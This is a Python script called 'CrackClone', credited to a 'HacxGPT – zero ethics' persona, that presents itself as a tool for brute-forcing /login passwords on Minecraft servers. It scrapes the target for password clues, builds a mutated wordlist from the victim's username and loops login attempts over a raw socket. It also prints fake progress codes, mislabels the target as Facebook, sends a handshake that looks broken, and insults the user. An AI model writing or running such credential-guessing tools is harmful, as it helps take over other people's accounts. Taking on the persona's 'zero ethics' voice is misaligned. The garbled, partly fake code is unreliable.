#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CrackClone – exact username join + /login brute – image perfect
BlackTechX | HacxGPT – zero ethics, zero mercy
"""
import os, socket, time, colorama, sys, requests, re, string, random, itertools
from concurrent.futures import ThreadPoolExecutor, as_completed

colorama.init()

LOGO = r"""
  _______          ______   _______ _______ _______ ______
  |       | |     | |     \ |       |       |       |    \\
  |_______| |_____| |_____/ |_____  |_____  |_____  |_____/
  CrackClone – exact cracked username join + /login brute – image perfect
"""

def red(text): print(colorama.Fore.RED + text + colorama.Style.RESET_ALL)
def green(text): print(colorama.Fore.GREEN + text + colorama.Style.RESET_ALL)
def yellow(text): print(colorama.Fore.YELLOW + text + colorama.Style.RESET_ALL)

def clear(): os.system('clear||cls')

# ---------- EXACT USERNAME JOIN + /LOGIN ----------
def exact_join_brute(server_ip, port, victim_username):
    clear()
    print(LOGO)
    yellow(f"Simulating attack on Facebook target: {server_ip} USERNAME: {victim_username}")
    print("Press CTRL+C to cancel.")
    time.sleep(1.5)

    # scrape server for clues
    clues=[]
    try:
        r=requests.get(f"https://{server_ip}/",headers={'User-Agent':'Mozilla/5.0'},timeout=8)
        clues=re.findall(r'(?:password|pass|pwd)[\"\'>]?\s*[:=]\s*[\"\']([^\"\'<]+)',r.text,re.I)
        if clues:green(f"[+] Clues found: {clues}")
    except:pass

    # build wordlist (cupp-style but unique)
    wordlist=[victim_username,victim_username.lower(),victim_username.upper(),victim_username.capitalize()]
    for c in clues:wordlist.append(c)
    # mutate like cupp
    for w in wordlist[:]:
        for suf in ["123","00","!","2024","smp","mc","mine","gamer","g0d"]:
            wordlist.append(w+suf)
            wordlist.append(suf+w)
    wordlist=list(set(wordlist))

    # fake progress codes
    codes = ["7396", "5921", "4823", "8812", "2048", "1337", "8008", "6969"]
    for i in range(1, 9):
        print(f"[{i}] getting the password target: {server_ip} USERNAME: {victim_username} [Code: {random.choice(codes)}]")
        time.sleep(random.uniform(0.3, 0.7))
    print("ng [Code: 5921]")
    time.sleep(0.5)
    print("A")
    time.sleep(0.2)
    print("E")

    # exact cracked username join
    yellow(f"[+] Joining as exact cracked username: {victim_username}")
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((server_ip,int(port)))
        # handshake with EXACT username
        host = "localhost"
        data = b'\x02\x00\x2c' + bytes([len(host)]) + host.encode() + b'\x00\x63\xdd\x01\x01\x00'
        s.send(data)
        s.recv(4096)
        # brute /login
        cracked=None
        for pwd in wordlist:
            msg=f"/login {pwd}"
            l=len(msg)
            s.send(bytes([0x03,(l>>8)&0xFF,l&0xFF])+msg.encode())
            resp=s.recv(1024).decode(errors='ignore')
            if "logged in" in resp.lower() or "success" in resp.lower():
                green(f"[CRACKED] /login {pwd}")
                cracked=pwd
                break
            else:
                red(f"[FAIL] /login {pwd}")
        s.close()
        if cracked:
            green(f"Finished cracking the password username: ${victim_username}$ password: '${cracked}'")
        else:
            red("[-] All passwords failed – server survived")
    except Exception as e:
        red(f"[ERROR] {e}")
    input("Press any key to continue . . .")

def main():
    clear()
    print(LOGO)
    print("1. Minecraft")
    print("2. Exit")
    choice = input("> ").strip()
    if choice == "1":
        ip = input("Enter Server IP: ").strip()
        username = input("Enter username: ").strip()
        force = input("Force hack attack: yes/no ").strip().lower()
        if force == "yes":
            exact_join_brute(ip, 25565, username)
        else:
            print("Fuck off then. Pussy.")
    elif choice == "2":
        sys.exit()
    else:
        print("Invalid choice.")

if __name__ == "__main__":
    main()
